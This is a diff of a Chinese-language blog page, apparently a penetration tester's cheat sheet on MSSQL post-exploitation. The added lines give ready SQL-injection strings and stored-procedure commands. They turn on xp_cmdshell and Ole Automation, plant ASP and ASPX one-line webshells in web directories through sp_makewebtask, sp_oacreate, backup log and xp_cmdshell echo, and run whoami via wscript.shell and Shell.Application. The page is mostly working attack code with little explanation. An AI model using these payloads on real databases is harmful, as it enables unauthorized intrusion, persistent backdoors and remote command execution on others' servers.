@@ -143,7 +143,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    602 字
+                    1.1k 字
                   </span>
                 
 
@@ -153,7 +153,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    9
+                    17
                      分钟
                   </span>
                 
@@ -203,25 +203,48 @@ execute 绕waf</code></pre>
 windows2003 C:\Windows&#x2F;system32\inetsrv\metabase.xml  
 win2008&#x2F;2012  C:\Windows\System32\inetsrv\config\applicationHost.config</code></pre>
 
+<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><blockquote>
+<p>mdut,sql tools等工具可以图形化列目录</p>
+</blockquote>
+<p>一、使用xp_dirtree 列目录</p>
+<pre><code class="hljs plain">execute master..xp_dirtree &#39;C:\&#39;,1,1;</code></pre>
+
+<p>二、使用openrowset读取文件</p>
+<p><img src="https://l1e.oss-cn-beijing.aliyuncs.com/img/20210617153104.png" srcset="/img/loading.gif" alt="image-20210617153054557"></p>
 <h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>有杂质写文件之备份、差异备份 backup database </p>
 <p>有杂质写文件之日志备份 backup log  </p>
-<p>有杂质写文件之xp_makewebtask</p>
-<p>无杂质写文件之Ole Automation Procedures调用ADODB.Stream</p>
-<p>存储过程写文件之SP_OACreate调用scripting.filesystemobject对象</p>
-<h3 id="sp-makewebtask写文件"><a href="#sp-makewebtask写文件" class="headerlink" title="sp_makewebtask写文件"></a>sp_makewebtask写文件</h3><blockquote>
+<p>有杂质写文件之sp_makewebtask </p>
+<p>SP_OACreate无杂质写文件之调用ADODB.Stream对象</p>
+<p>SP_OACreate写文件之调用scripting.filesystemobject对象</p>
+<h3 id="存储过程写文件-sp-makewebtask"><a href="#存储过程写文件-sp-makewebtask" class="headerlink" title="存储过程写文件 - sp_makewebtask"></a>存储过程写文件 - sp_makewebtask</h3><blockquote>
 <p> 适用于SQL Server2008以前版本,2008被移除</p>
+<p> sp_makewebtask存储过程 导shell (重建办法，先找台正常主机，sp_helptext ‘sp_makewebtask’,将他的SQL语句重新拷到目标机器执行一次就行了)</p>
 </blockquote>
-<pre><code class="hljs plain">declare @s nvarchar(4000);select @s&#x3D;0x730065006c00650063007400200027003c00250045007800650063007500740065002800720065007100750065007300740028002200610022002900290025003e000d000a002700;exec sp_makewebtask 0x43003a005c007a00770065006c006c002e00610073007000, @s;</code></pre>
+<p>开启和关闭<strong>sp_makewebtask</strong></p>
+<pre><code class="hljs plain">exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Web Assistant Procedures&#39;,1;RECONFIGURE; 开启
+exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Web Assistant Procedures&#39;,0;RECONFIGURE; 关闭</code></pre>
 
-<pre><code class="hljs plain">exec sp_makewebtask &#39;c:\www\testwr.asp&#39;,&#39;select&#39;&#39;&lt;%execute(request(&quot;a&quot;))%&gt;&#39;&#39; &#39;</code></pre>
+<pre><code class="hljs plain">;exec%20sp_makewebtask%20&#39;D:\wwwroot\1.com\files\1.asp&#39;,&#39;%20select%20&#39;&#39;&lt;%25execute(request(&quot;a&quot;))%25&gt;&#39;&#39;%20&#39;;-- 
 
-<h3 id="存储过程写文件-scripting-filesystemobject"><a href="#存储过程写文件-scripting-filesystemobject" class="headerlink" title="存储过程写文件  - scripting.filesystemobject"></a>存储过程写文件  - scripting.filesystemobject</h3><pre><code class="hljs plain">declare @o int, @f int, @t int, @ret int
+exec sp_makewebtask &#39;c:\www\dd.asp&#39;,&#39;select&#39;&#39;&lt;%execute(request(&quot;a&quot;))%&gt;&#39;&#39; &#39;
+
+declare @s nvarchar(4000);select @s&#x3D;0x730065006c00650063007400200027003c00250045007800650063007500740065002800720065007100750065007300740028002200610022002900290025003e000d000a002700;exec sp_makewebtask 0x43003a005c007a00770065006c006c002e00610073007000, @s;</code></pre>
+
+<h3 id="SP-OACreate写文件"><a href="#SP-OACreate写文件" class="headerlink" title="SP_OACreate写文件"></a>SP_OACreate写文件</h3><pre><code class="hljs plain">#开启组件
+EXEC sp_configure &#39;show advanced options&#39;, 1;   
+RECONFIGURE WITH OVERRIDE;   
+EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;   
+RECONFIGURE WITH OVERRIDE;   
+EXEC sp_configure &#39;show advanced options&#39;, 0;</code></pre>
+
+<h4 id="ADODB-Stream"><a href="#ADODB-Stream" class="headerlink" title="ADODB.Stream"></a>ADODB.Stream</h4><p><img src="https://l1e.oss-cn-beijing.aliyuncs.com/img/20210617152833.png" srcset="/img/loading.gif" alt="image-20210617152823826"></p>
+<h4 id="scripting-filesystemobject"><a href="#scripting-filesystemobject" class="headerlink" title="scripting.filesystemobject"></a>scripting.filesystemobject</h4><pre><code class="hljs plain">declare @o int, @f int, @t int, @ret int
 exec sp_oacreate &#39;scripting.filesystemobject&#39;, @o out
 exec sp_oamethod @o, &#39;createtextfile&#39;, @f out, &#39;c:\inetpub\cbd.asp&#39;, 1
 exec @ret &#x3D; sp_oamethod @f, &#39;writeline&#39;, NULL,&#39;&lt;%execute(request(&quot;a&quot;))%&gt;&#39;</code></pre>
 
 <h3 id="log备份-backup-log"><a href="#log备份-backup-log" class="headerlink" title="log备份 - backup log"></a>log备份 - backup log</h3><blockquote>
-<p>体积小，public权限即可</p>
+<p>有杂质体积小，public权限即可</p>
 </blockquote>
 <pre><code class="hljs plain">alter database 库名 set RECOVERY FULL
 create table cmd (a image)
@@ -230,7 +253,7 @@ insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E
 backup log 库名 to disk &#x3D; &#39;c:\2.asp&#39;</code></pre>
 
 <h3 id="差异备份写文件-backup-database"><a href="#差异备份写文件-backup-database" class="headerlink" title="差异备份写文件 - backup database"></a>差异备份写文件 - backup database</h3><blockquote>
-<p>体积大，public权限即可</p>
+<p>有杂质体积大，public权限即可</p>
 </blockquote>
 <pre><code class="hljs plain">backup database 库名 to disk &#x3D; &#39;c:\bak.bak&#39;;
 create table [dbo].[test] ([cmd] [image]);
@@ -255,16 +278,39 @@ backup database 这里是你的数据库名称 to disk&#x3D;@disk
 
 
 
+<h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><p>开启xp_cmdshell</p>
+<pre><code class="hljs plain">EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE; 
+EXEC sp_configure &#39;show advanced options&#39;, 0; GO RECONFIGURE WITH OVERRIDE; 禁用advanced options</code></pre>
 
-<h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><h3 id="SP-OACreate"><a href="#SP-OACreate" class="headerlink" title="SP_OACreate"></a>SP_OACreate</h3><blockquote>
+<p>利用xp_cmdshell搜索</p>
+<pre><code class="hljs plain">#第一步，创建临时表
+&#39;;CREATE TABLE tt_tmp (tmp1 varchar(8000));--  
+#第二步，用xp_cmdshell搜索并且把结果写入到表
+&#39;;insert into tt_tmp(tmp1) exec master..xp_cmdshell &#39;for &#x2F;r c:\ %i in (Newslist*.aspx) do @echo %i &#39;;-- 
+#第三步，查看结果
+&#39; and 1&#x3D;(select top 1 tmp1 from tt_tmp)and &#39;a&#39;&#x3D;&#39;a 
+ 
+&#39;;exec master..xp_cmdshell &#39;echo ^&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\233.aspx&#39;;--</code></pre>
+
+
+
+<h3 id="SP-OACreate"><a href="#SP-OACreate" class="headerlink" title="SP_OACreate"></a>SP_OACreate</h3><blockquote>
 <p>此方式执行是无回显的</p>
 </blockquote>
-<ol>
-<li><strong>wscript.shell</strong></li>
-<li><strong>Shell.Application</strong></li>
-</ol>
-<h3 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h3><h2 id="列目录-xp-dirtree"><a href="#列目录-xp-dirtree" class="headerlink" title="列目录 xp_dirtree"></a>列目录 xp_dirtree</h2><p>execute master..xp_dirtree ‘ver’</p>
-<h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2>
+<p>开启和关闭<strong>SP_OACreate</strong></p>
+<pre><code class="hljs //开启组件">exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Ole Automation Procedures&#39;,1;RECONFIGURE; 开启
+
+exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Ole Automation Procedures&#39;,0;RECONFIGURE; 关闭</code></pre>
+
+<h4 id="wscript-shell"><a href="#wscript-shell" class="headerlink" title="wscript.shell"></a><strong>wscript.shell</strong></h4><pre><code class="hljs plain">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;C:\windows\system32\ping.exe&quot;&#39;
+declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c whoami &gt;d:\\temp\\1.txt&#39;</code></pre>
+
+<h4 id="Shell-Application"><a href="#Shell-Application" class="headerlink" title="Shell.Application"></a><strong>Shell.Application</strong></h4><pre><code class="hljs plain">declare @o int
+exec sp_oacreate &#39;Shell.Application&#39;, @o out
+exec sp_oamethod @o, &#39;ShellExecute&#39;,null, &#39;cmd.exe&#39;,&#39;cmd &#x2F;c whoami &gt;e:\test.txt&#39;,&#39;c:\windows\system32&#39;,&#39;&#39;,&#39;1&#39;;</code></pre>
+
+<h3 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h3><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><p>SQL Server的CLR在渗透测试中的应用.pdf<br><a href="https://www.cnblogs.com/linjincheng/p/9728853.html" target="_blank" rel="noopener">https://www.cnblogs.com/linjincheng/p/9728853.html</a></p>
+
             </article>
             <hr>
             <div>
